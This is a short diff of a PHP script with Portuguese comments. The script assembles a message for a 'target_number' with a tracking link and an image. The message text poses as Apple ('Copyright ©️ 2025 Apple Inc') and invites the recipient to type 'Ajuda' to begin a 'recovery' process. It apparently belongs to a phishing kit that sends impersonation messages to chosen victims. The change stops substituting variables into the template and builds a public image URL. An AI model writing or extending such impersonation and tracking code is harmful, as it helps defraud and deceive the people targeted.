@@ -108,13 +108,14 @@ if (true) {
                 "Para iniciar o processo de recuperação, digite *Ajuda*\n" .
                 "> *Copyright ©️ 2025 Apple Inc*";
     
-    // Substitui as variáveis no texto
-    $finalMessage = strtr($template, $vars);
-    
+    $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https' : 'http';
+    $baseUrl = $protocol . "://" . $_SERVER['HTTP_HOST'];
+    $publicMediaPath = $baseUrl . '/uploads/Dynamic.png';
+
     $payload = [
         'session' => $session_id,
         'number' => $target_number,
-        'message' => $finalMessage,
+        'message' => $template, // Envia o texto sem modificar (sem strtr)
         'mediaPath' => $publicMediaPath,
         'trackLink' => $trackLink,
         'language' => $idioma
